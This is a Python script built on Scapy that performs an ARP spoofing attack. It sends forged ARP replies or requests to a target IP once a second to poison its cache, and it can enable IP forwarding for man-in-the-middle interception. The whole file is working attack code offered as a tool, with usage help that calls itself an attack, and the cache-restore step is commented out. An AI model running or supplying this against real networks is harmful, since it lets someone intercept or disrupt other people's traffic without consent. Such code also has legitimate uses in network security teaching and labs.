import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import Ether, ARP, srp, send
import time
import os
import sys
import socket

def enable_route():
    # Enables IP forwarding on all windows and linux
    print("Enabling IP Routing...")
    
    # Enable Ip route forwarding in windows
    if "nt" in os.name:
       from services import WService
       # enable Remote Access service
       service = WService("RemoteAccess")
       service.start()  
   
    # Enable Ip route forwarding in Linux    
    else :
       file_path = "/proc/sys/net/ipv4/ip_forward"
       with open(file_path) as f:
         if "1" in f.read() :
           # already enabled
            print("...IP Routing already enabled")              
            return
       with open(file_path, "w") as f:            
            print(1, file=f) 
            print("...IP Routing enabled")    

def get_mac(ip):
    """
    Returns MAC address of a device connected to the network
    returns None  if Ip is down
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def arp_reply(target_ip,target_mac, host_ip, verbose=True):
    """
    Use ARP reply to poision the `target_ip` saying that we are `host_ip`.

    """
    #   #construct the faked arp reply packet to send
    #the source mac address by default 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    #arp_response = ARP(pdst=target_ip, hwdst=target_mac,hwsrc="00:00:00:00:00:02", psrc=host_ip, op='is-at')
    
    #For different source
    #arp_response = ARP(pdst=target_ip, hwdst=target_mac,hwsrc="00:00:00:00:00:02", psrc=host_ip, op='is-at')
    
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = Ether().src
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def arp_request(target_ip,target_mac, host_ip, verbose=True):
    """
   Use ARP request to poison the 'target_ip' cache.
   It asks for the mack address of the 'target_ip', telling him to send the reply to host_ip,
   so it will store in its cache a faked mac address for host_ip.
    
    """    
    #construct the faked arp request packet to send
    #arppkt = Ether()/ARP()
    arppkt = ARP()
    #arppkt[ARP].hwsrc = 
    
    #The destination  mac address
    arppkt[ARP].hwdst = target_mac
    
    #the source IP address
    arppkt[ARP].psrc = host_ip
    
    #the destination  IP address
    arppkt[ARP].pdst = target_ip
    
    #the source mac address by default 'hwsrc' is the real MAC address of the sender (ours)
    
    #arppkt[Ether].dst = target_mac
    #arppkt[Ether].src = "00:00:00:00:00:04"
 
    #send the packet
    #verbose = 0 means that we send the packet without printing any thing
    send(arppkt, verbose=0)
    
    if verbose:
        #print the message we sent
        print("[+] Sent to {} : who has {} tell {}".format(target_ip,target_ip, host_ip))
        
if __name__ == "__main__":
    
    # Count the arguments
    len_args = len(sys.argv) -1
    if len_args == 1 and sys.argv[1]=="-h":
        print ("""
Use this script to perform an ARP spoofing attack, either suing arp request packets or ARP reply packets.
run the script with the following options:
-p for arp spoofing attack using arp reply packets. OR (-q for arp spoofing attack using arp request packets.)
-t target_ip : to specify the target IP address.
-f faked_ip: to specify the faked IP address to poision with.

Example:
  arp_attack.py -p -t 10.0.0.2 -f 10.0.0.4""")
        
    elif len_args == 5:          
       
        arg1 = sys.argv[1]
        # victim ip address
        arg2 = sys.argv[2]
        target_ip = sys.argv[3]
        
        arg4 = sys.argv[4]
        #Faked ip address to poision with
        faked_ip = sys.argv[5]
        
        if arg1 not in ["-p","-q"] or arg2!="-t" or arg4!="-f" : 
            print("Uncorrect arguments. Enter -h for help")
            sys.exit()    
                       
        try:
            socket.inet_aton(target_ip)
            socket.inet_aton(faked_ip)            
           
            # get the mac address of the target
            target_mac = get_mac(target_ip)
                      
            # print progress to the screen
            verbose = True
            
            # enable ip forwarding
            #enable_route()
            
            try:
                while True:
                 #for i in range(0,7):   # poision target_ip cache using ARP reply
                    if arg1 == "-p":
                        arp_reply(target_ip,target_mac, faked_ip, verbose)
                        
                    # poision target_ip cache using ARP request
                    else :
                        arp_request(target_ip,target_mac, faked_ip, verbose)
                        
                    # sleep for one second0
                    time.sleep(1)
            except KeyboardInterrupt:
                print("[!] Detected CTRL+C ")
                #restore(target, host)
                #restore(host, target) 
  
        except socket.error:
            print("Invalid IP")    
            sys.exit()         
            
    else :
       print("Uncorrect number of arguments. Enter -h for help")
  